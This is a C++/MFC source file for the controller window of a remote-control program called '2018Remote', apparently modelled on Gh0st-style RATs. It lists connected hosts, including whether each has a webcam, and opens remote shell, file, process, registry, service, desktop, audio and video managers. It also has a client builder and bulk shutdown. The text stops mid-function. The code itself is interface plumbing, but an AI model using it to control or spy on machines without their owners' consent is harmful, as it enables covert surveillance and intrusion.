
// ServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "Common.h"
#include <WinUser.h>
#include "InstantMessageDlg.h"
#include "CmdManagerDlg.h"
#include "ProcessManagerDlg.h"
#include "WindowManagerDlg.h"
#include "FileManagerDlg.h"
#include "ServerSetManagerDlg.h"
#include "IOCPServer.h"
#include "_CArray.h"
#include "CreateClientDlg.h"
#include "RemoteControllDlg.h"
#include "ServiceManagerDlg.h"
#include "RegisterManagerDlg.h"



COLUMN_DATA __Column_Data_Online[] =
{
	{ "IP",			120 },
	{ "区域",			50 },
	{ "计算机名/备注",	160 },
	{ "操作系统",		128 },
	{ "CPU",			180 },
	{ "摄像头",		81 },
	{ "PING",			151 }
};
COLUMN_DATA __Column_Data_Message[] =
{
	{ "信息类型",		200 },
	{ "时间",			200 },
	{ "信息内容",	    490 }
};



//构造函数   InitDialog  OnPaint  OnSize
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
UINT __Indicators[] =
{
	IDR_STATUSBAR_SERVER_STRING

};
#define UM_ICONNOTIFY WM_USER+1


#define UM_CLIENT_LOGIN WM_USER+1000

#define UM_OPEN_INSTANT_MESSAGE_DIALOG WM_USER+1005
#define UM_OPEN_CMD_MANAGER_DIALOG     WM_USER+2999
#define UM_OPEN_PROCESS_MANAGER_DIALOG WM_USER+3000
#define UM_OPEN_WINDOW_MANAGER_DIALOG  WM_USER+3001
#define UM_OPEN_REMOTE_CONTROLL_DIALOG WM_USER+3002
#define UM_OPEN_FILE_MANAGER_DIALOG    WM_USER+3003
#define WM_OPEN_AUDIO_MANAGER_DIALOG   WM_USER+3004
#define UM_OPEN_VIDEO_MANAGER_DIALOG   WM_USER+3005
#define UM_OPEN_SERVICE_MANAGER_DIALOG WM_USER+3007 
#define UM_OPEN_REGISTER_MANAGER_DIALOG WM_USER+3008

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

CIOCPServer*  __IOCPServer = NULL;
CServerDlg*   __ServerDlg   = NULL;

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CServerDlg 对话框



CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SERVER_DIALOG, pParent)
{
	
	__ServerDlg = this;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	//初始化类成员变量
	m_Count = 0;

	//不能访问窗口上资源
	m_Bitmap[0].LoadBitmap(IDB_BITMAP_FIND);
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_ONLINE, m_CListCtrl_Server_Online);
	DDX_Control(pDX, IDC_LIST_SERVER_MESSAGE, m_CListCtrl_Server_Message);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_COMMAND(ID_SERVERMAIN_SET, &CServerDlg::OnServerMainSet)
	ON_COMMAND(ID_SERVERMAIN_EXIT, &CServerDlg::OnServerMainExit)
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
	ON_WM_CLOSE()
	ON_COMMAND(ID_NOTIFYICONDATA_EXIT, &CServerDlg::OnNotifyicondataExit)
	ON_COMMAND(ID_NOTIFYICONDATA_SHOW, &CServerDlg::OnNotifyicondataShow)
	ON_WM_SIZE()

	ON_COMMAND(ID_SERVERMAIN_TEST_ADDUSER, &CServerDlg::OnServermainTestAddUser)


	//用户上线
	ON_MESSAGE(UM_CLIENT_LOGIN, OnClientLogin)

	//即时消息
	ON_MESSAGE(UM_OPEN_INSTANT_MESSAGE_DIALOG, OpenInstantMessageDialog)

	//CMD管理
	ON_COMMAND(IDM_SERVER_CMD_MANAGER, &CServerDlg::OnServerCmdManager)
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)

	//进程管理
	ON_COMMAND(IDM_SERVER_PROCESS_MANAGER, &CServerDlg::OnServerProcessManager)
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnOpenProcessManagerDialog)

	//窗口管理
	ON_COMMAND(IDM_SERVER_WINDOW_MANAGER, &CServerDlg::OnServerWindowManager)
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)

	//文件管理
	ON_COMMAND(IDM_SERVER_FILE_MANAGER, &CServerDlg::OnServerFileManager)
	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)


	//远控管理
	ON_COMMAND(IDM_SERVER_REMOTE_CONTROLL, &CServerDlg::OnServerRemoteControll)
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROLL_DIALOG, OnOpenRemoteControllDialog)

	

	//视频
	ON_COMMAND(IDM_SERVER_VIDEO_MANAGER, &CServerDlg::OnServerVideoManager)
	ON_MESSAGE(UM_OPEN_VIDEO_MANAGER_DIALOG, OnOpenVideoManagerDialog)

	//音频
	ON_COMMAND(IDM_SERVER_AUDIO_MANAGER, &CServerDlg::OnServerAudioManager)
	ON_MESSAGE(WM_OPEN_AUDIO_MANAGER_DIALOG, OnOpenAudioManagerDialog)



	//服务
	ON_COMMAND(IDM_SERVER_SERVICE_MANAGER, &CServerDlg::OnServerServiceManager)
	ON_MESSAGE(UM_OPEN_SERVICE_MANAGER_DIALOG, OnOpenServiceManagerDialog)
	
	
	
	//注册表
	ON_COMMAND(IDM_SERVER_REGISTER_MANAGER, &CServerDlg::OnServerRegisterManager)
	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)



	//生成客户端
	ON_COMMAND(IDM_SERVER_CREATE_CLIENT, &CServerDlg::OnServerCreateClient)

	
	
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER_ONLINE, &CServerDlg::OnNMRClickListServerOnline)
	ON_COMMAND(ID_LISTSERVERONLINEMAIN_DELETE, &CServerDlg::OnListserveronlinemainDelete)
	ON_COMMAND(ID_LISTSERVERONLINEMAIN_MESSAGE, &CServerDlg::OnListserveronlinemainMessage)
	ON_COMMAND(ID_LISTSERVERONLINEMAIN_SHUTDOWN, &CServerDlg::OnListserveronlinemainShutdown)
END_MESSAGE_MAP()

// CServerDlg 消息处理程序

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	InitTrueToolBarMain();
	InitListControl();
	InitSolidMenu();				   //创建固态菜单
	InitNotifyIconData();			   //托盘
	InitStatusBar();


	//通信对象
	Activate(2356, 100);




	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}


VOID CServerDlg::Activate(int Port, int MaxConnections)
{
	__IOCPServer = new CIOCPServer;                                   //动态申请我们的类对象

	if (__IOCPServer == NULL)
	{
		return;
	}
	if (__IOCPServer->StartServer(WindowNotifyProcedure, Port) == TRUE)    //函数指针
	{

	}
	CString v1;
	v1.Format("监听端口: %d成功", Port);
	WindowShowMessage(TRUE, v1);
}
VOID CALLBACK CServerDlg::WindowNotifyProcedure(PCONTEXT_OBJECT ContextObject)
{
	MessageHandleIO(ContextObject);
}
VOID CServerDlg::MessageHandleIO(CONTEXT_OBJECT* ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}

	if (ContextObject->DlgID > 0)
	{

		switch (ContextObject->DlgID)
		{

		case CMD_MANAGER_DIALOG:
		{
			CCmdManagerDlg *Dlg = (CCmdManagerDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();

			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CProcessManagerDlg *Dlg = (CProcessManagerDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();

			break;
		}
		case FILE_MANAGER_DIALOG:
		{
			CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();
			break;

		}
		case REMOTE_CONTROLL_DIALOG:
		{
			CRemoteControllDlg *Dlg = (CRemoteControllDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();
			break;
		}
		case SERVICE_MANAGER_DIALOG:
		{

			CServiceManagerDlg *Dlg = (CServiceManagerDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();
			break;
		}
		case REGISTER_MANAGER_DIALOG:
		{
			CRegisterManagerDlg *Dlg = (CRegisterManagerDlg*)ContextObject->DlgHandle;
			Dlg->OnReceiveComplete();

			break;
		}
		}
		return;
	}
	switch (ContextObject->m_InDeCompressedBufferData.GetArray(0)[0])
	{
	case CLIENT_LOGIN: // 上线包  shine
	{

		__ServerDlg->PostMessageA(UM_CLIENT_LOGIN,(WPARAM)(PROCESS_MANAGER::CLIENT_MODE),(LPARAM)ContextObject);   //使用自定义消息

		break;
	}
	case CLIENT_GET_OUT:
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}	
	case CLIENT_INSTANT_MESSAGE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_INSTANT_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_SHUT_DOWN_REPLY:
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);

		break;
	}
	case CLIENT_CMD_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG,0,
			(LPARAM)ContextObject);
		break;
	}
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG,(WPARAM)PROCESS_MANAGER::CLIENT_MODE, 
			(LPARAM)ContextObject);
		break;
	}
	case CLIENT_WINDOW_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 
			(WPARAM)WINDOW_MANAGER::CLIENT_MODE,(LPARAM)ContextObject);
		break;
	}
	case CLIENT_FILE_MANAGER_REPLY:
	{
		// 打开文件管理器窗口
		__ServerDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG,
			(WPARAM)FILE_MANAGER::CLIENT_MODE, (LPARAM)ContextObject);
		break;
	}

	case CLIENT_REMOTE_CONTROLL_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_CONTROLL_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_SERVICE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG,(WPARAM)SERVICE_MANAGER::CLIENT_MODE,
			(LPARAM)ContextObject);
		break;
	}
	case CLIENT_REGISTER_MANAGER_REPLY:
	{

		__ServerDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, (WPARAM)SERVICE_MANAGER::CLIENT_MODE,
			(LPARAM)ContextObject);
		break;
	}

	/*

	case VIDEO_MANAGER::COMMAND_VIDEO_MANAGER_REPLY:
	{

		g_ServerDlg->PostMessage(WM_OPEN_VIDEO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case AUDIO_MANAGER::COMMAND_AUDIO_MANAGER_REPLY:
	{

		g_ServerDlg->PostMessage(WM_OPEN_AUDIO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	*/

	}
}
VOID CServerDlg::WindowShowMessage(BOOL IsOk, CString Message)
{
	CString v1;
	CString v2; 
	CString v3;
 
	CTime Time = CTime::GetCurrentTime();          //定义一个CTime 类的一个对象 t 使用类中的成员函数GetCurrentTime() 而不是 SDK函数
	v2 = Time.Format("%H:%M:%S");
	if (IsOk)
	{
		v1 = L"执行成功";
	}
	else
	{
		v1 = L"执行失败";
	}

	m_CListCtrl_Server_Message.InsertItem(0, v1);    //向控件中设置数据
	m_CListCtrl_Server_Message.SetItemText(0, 1, v2);
	m_CListCtrl_Server_Message.SetItemText(0, 2, Message);


	
	if (Message.Find("上线") > 0)         //处理上线还是下线消息
	{
		m_Count++;
	}
	else if (Message.Find("下线") > 0)
	{
		m_Count--;
	}
	else if (Message.Find("断开") > 0)
	{
		m_Count--;
	}

	m_Count = (m_Count <= 0 ? 0 : m_Count);         //防止iCount 有-1的情况
	v3.Format("有%d个主机在线", m_Count);
	m_StatusBar.SetPaneText(0, v3);   //在状态条上显示文字
}


HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
void CServerDlg::OnClose()
{	// TODO: 在此添加消息处理程序代码和/或调用默认值
//	if (::MessageBox(NULL, "你确定?", "2018Remote", MB_OKCANCEL) == IDOK)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);

		if (__IOCPServer != NULL)
		{
			delete __IOCPServer;
			__IOCPServer = NULL;
		}
		CDialogEx::OnClose();
	}
//	else
	{

	}

}
void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文
		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}
void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (m_StatusBar.m_hWnd != NULL)
	{    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}


	if (m_CTrueColorToolBar_Server_Main.m_hWnd != NULL)                  //工具条
	{
		CRect Rect;
		Rect.top = Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = 80;
		m_CTrueColorToolBar_Server_Main.MoveWindow(Rect);             //设置工具条大小位置
	}

}
void CServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{

	// BMK Hello

	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

VOID CServerDlg::InitListControl()
{
//	CRect v1;
//	GetWindowRect(&v1);
//	v1.bottom += 20;
//	MoveWindow(v1);
	for (int i = 0; i<sizeof(__Column_Data_Online)/sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Online.InsertColumn(i, __Column_Data_Online[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Online[i].TitleWidth);
	}
	m_CListCtrl_Server_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i<sizeof(__Column_Data_Message) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Message.InsertColumn(i, __Column_Data_Message[i].TitleData, LVCFMT_CENTER,
			__Column_Data_Message[i].TitleWidth);
	}
	m_CListCtrl_Server_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}
VOID CServerDlg::InitSolidMenu()
{
	HMENU  Menu;
	Menu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU_SERVER_MAIN));        //载入菜单资源
	::SetMenu(this->GetSafeHwnd(), Menu);                                //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                                  //显示菜单
}
void CServerDlg::OnServerMainSet()
{
	//弹出Dlg(模态 !模态)
	CServerSetManagerDlg Dlg;    //构造函数
	Dlg.DoModal();
	
	



}
void CServerDlg::OnServerMainExit()
{


	
	//CDialogEx::OnClose();   
	SendMessage(WM_CLOSE);	
}
VOID CServerDlg::InitNotifyIconData()
{
	CString Tip = "2018Remote远程协助软件.........";       
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);                //大小赋值	
	m_NotifyIconData.hWnd   = m_hWnd;                                //父窗口    是被定义在父类CWnd类中
	m_NotifyIconData.uID    = IDR_MAINFRAME;
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态  气泡提示
	m_NotifyIconData.hIcon  = m_hIcon;  
	m_NotifyIconData.uCallbackMessage = UM_ICONNOTIFY;              //回调消息(自定义)
                                                                    //icon 变量
	                                                                //气泡提示
	lstrcpyn(m_NotifyIconData.szTip, (LPCSTR)Tip, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);                  //显示托盘
	//消息 (消息声明  消息与函数关联  函数的声明  函数的实现)
}
VOID CServerDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible()) 
		{
			//窗口不显示
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}

	case WM_RBUTTONDOWN:
	{
		CMenu Menu;
		Menu.LoadMenu(IDR_MENU_NOTIFYICONDATA);
		CPoint Point;
		GetCursorPos(&Point);
		SetForegroundWindow();   //设置当前窗口
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			Point.x, Point.y, this, NULL);

		break;
	}
	}
}
void CServerDlg::OnNotifyicondataExit()
{
	// TODO: 在此添加命令处理程序代码
}
void CServerDlg::OnNotifyicondataShow()
{
	// TODO: 在此添加命令处理程序代码
}
VOID CServerDlg::InitStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators,
			sizeof(__Indicators) / sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return;
	}
	CRect v1;
	GetWindowRect(&v1); //Top Left Bottom Rigth
	v1.bottom += 1;   //没有任何意义  触发OnSize立即执行
	MoveWindow(v1);
}
VOID CServerDlg::InitTrueToolBarMain()
{
	if (!m_CTrueColorToolBar_Server_Main.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_CTrueColorToolBar_Server_Main.LoadToolBar(IDR_TOOLBAR_SERVER_MAIN))  //创建一个工具条  加载资源
	{

		return;
	}
	m_CTrueColorToolBar_Server_Main.LoadTrueColorToolBar
	(
		48,    //加载真彩工具条
		IDB_BITMAP_SERVER_MAIN,
		IDB_BITMAP_SERVER_MAIN,
		IDB_BITMAP_SERVER_MAIN
	);  //和我们的位图资源相关联

	RECT v1, v2;
	GetWindowRect(&v2);   //得到整个窗口的大小
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right - v2.left + 10;
	m_CTrueColorToolBar_Server_Main.MoveWindow(&v1, TRUE);


	m_CTrueColorToolBar_Server_Main.SetButtonText(0, "终端管理");     //在位图的下面添加文件
	m_CTrueColorToolBar_Server_Main.SetButtonText(1, "进程管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(2, "窗口管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(3, "桌面管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(4, "文件管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(5, "语音管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(6, "系统清理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(7, "视频管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(8, "服务管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(9, "注册表管理");
	m_CTrueColorToolBar_Server_Main.SetButtonText(10, "服务端设置");
	m_CTrueColorToolBar_Server_Main.SetButtonText(11, "客户端设置");
	m_CTrueColorToolBar_Server_Main.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示
}
//CtlList 控件上的右键消息
void CServerDlg::OnNMRClickListServerOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_SERVER_ONLINE_MAIN);               //加载菜单资源   资源和类对象关联  Online
	CMenu*	SubMenu = Menu.GetSubMenu(0);
	CPoint	Point;
	GetCursorPos(&Point);


	int	v1 = SubMenu->GetMenuItemCount();    //菜单上的子项
	if (m_CListCtrl_Server_Online.GetSelectedCount() == 0)         //如果没有选中
	{
		for (int i = 0; i < v1; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}

	}
	Menu.SetMenuItemBitmaps(ID_LISTSERVERONLINEMAIN_DELETE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_LISTSERVERONLINEMAIN_MESSAGE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_LISTSERVERONLINEMAIN_SHUTDOWN, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	*pResult = 0;
}
//删除用户
void CServerDlg::OnListserveronlinemainDelete()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_GET_OUT;   //向被控端发送一个COMMAND_SYSTEM
	SendingSelectedCommand(&IsToken, sizeof(BYTE));   //Context     PreSending   PostSending
	CString  ClientAddressData;
	int SelectedCount = m_CListCtrl_Server_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Online.GetNextSelectedItem(Pos);
		ClientAddressData = m_CListCtrl_Server_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Online.DeleteItem(Item);
		ClientAddressData += "强制断开";
		WindowShowMessage(true, ClientAddressData);
	}
}
//即时消息
void CServerDlg::OnListserveronlinemainMessage()
{

	//构建消息发送到客户端 	CLIENT_INSTANT_MESSAGE_REQUEST = 2,
	//客户端回传消息 CLIENT_INSTANT_MESSAGE_REPLY = 3 MessageHandleIO
	//MessageHandleIO  SendMessage(自定义消息  消息函数)
	//消息函数 创建对话框


	BYTE IsToken = CLIENT_INSTANT_MESSAGE_REQUEST;   
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
/*
*/
	// TODO: 在此添加命令处理程序代码
}
LRESULT CServerDlg::OpenInstantMessageDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;

	CInstantMessageDlg *Dlg = new CInstantMessageDlg(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_INSTANT_MESSAGE, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	return 0;
}

//关机
void CServerDlg::OnListserveronlinemainShutdown()
{
	// TODO: 在此添加命令处理程序代码

	BYTE IsToken = CLIENT_SHUT_DOWN_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));  //成群关机


	CString  ClientAddressData;
	int SelectedCount = m_CListCtrl_Server_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Online.GetNextSelectedItem(Pos);
		ClientAddressData = m_CListCtrl_Server_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Online.DeleteItem(Item);
		ClientAddressData += "强制断开";
		WindowShowMessage(true, ClientAddressData);
	}
}
//发送数据到客户端

VOID CServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{

	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();   //1[pcontext client]  2  3   //1    2
	while (Pos)
	{
		int	i = m_CListCtrl_Server_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CListCtrl_Server_Online.GetItemData(i); //																						// 发送获得驱动器列表数据包                                                 //查看ClientContext结构体
		__IOCPServer->OnClientPreSending(ContextObject, BufferData, BufferLength);         //Cleint   Context

	}
}

//用户上线
LRESULT CServerDlg::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CString ClientAddressData, ClientPosition, HostNameData, ProcessorNameStringData, IsWebCameraExist, WebSpeed,OSNameData;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据
	if (ContextObject == NULL)
	{
		return -1;
	}
	CString	v1;
	try
	{
		int v20 = ContextObject->m_InDeCompressedBufferData.GetArrayLength();
		int v21 = sizeof(LOGIN_INFO);
		if (ContextObject->m_InDeCompressedBufferData.GetArrayLength() != sizeof(LOGIN_INFO))
		{
			//return -1;
		}
		PLOGIN_INFOR	li = (PLOGIN_INFOR)ContextObject->m_InDeCompressedBufferData.GetArray();
		sockaddr_in     v2;
		memset(&v2, 0, sizeof(v2));
		int v3 = sizeof(sockaddr_in);
		int ReturnValue = getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);  //IP C   <---IP
		ClientAddressData = inet_ntoa(v2.sin_addr);

		//主机名称
		HostNameData = li->HostNameData;

		switch (li->OsVersionInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (li->OsVersionInfoEx.dwMajorVersion <= 4)
				OSNameData = "WindowsNT";
			if (li->OsVersionInfoEx.dwMajorVersion == 5 && li->OsVersionInfoEx.dwMinorVersion == 0)
				OSNameData = "Windows2000";
			if (li->OsVersionInfoEx.dwMajorVersion == 5 && li->OsVersionInfoEx.dwMinorVersion == 1)
				OSNameData = "WindowsXP";
			if (li->OsVersionInfoEx.dwMajorVersion == 5 && li->OsVersionInfoEx.dwMinorVersion == 2)
				OSNameData = "Windows2003";
			if (li->OsVersionInfoEx.dwMajorVersion == 6 && li->OsVersionInfoEx.dwMinorVersion == 0)
				OSNameData = "WindowsVista";
			if (li->OsVersionInfoEx.dwMajorVersion == 6 && li->OsVersionInfoEx.dwMinorVersion == 1)
				OSNameData = "Windows7";
			if (li->OsVersionInfoEx.dwMajorVersion == 6 && li->OsVersionInfoEx.dwMinorVersion == 2)
				OSNameData = "Windows10";
		}
		//CPU
		ProcessorNameStringData = li->ProcessorNameStringData;
		//网速
		WebSpeed.Format("%d", li->WebSpeed);
		IsWebCameraExist = li->IsWebCameraExist ? "有" : "无";

		//向控件添加数据
		AddCtrlListServerOnline(ClientAddressData, ClientPosition, HostNameData, OSNameData, ProcessorNameStringData,
			IsWebCameraExist, WebSpeed, ContextObject);   //Context 有套接字
	}
	catch (...) {}

}
VOID CServerDlg::AddCtrlListServerOnline(CString ClientAddressData, CString ClientPosition, CString HostNameData,
	CString OSNameData, CString ProcessorNameStringData, CString IsWebCameraExist, CString WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	//默认为0行  这样所有插入的新列都在最上面
	int i = m_CListCtrl_Server_Online.InsertItem(m_CListCtrl_Server_Online.GetItemCount(), ClientAddressData);
	m_CListCtrl_Server_Online.SetItemText(i, 1, ClientPosition);
	m_CListCtrl_Server_Online.SetItemText(i, 2, HostNameData);
	m_CListCtrl_Server_Online.SetItemText(i, 3, OSNameData);
	m_CListCtrl_Server_Online.SetItemText(i, 4, ProcessorNameStringData);
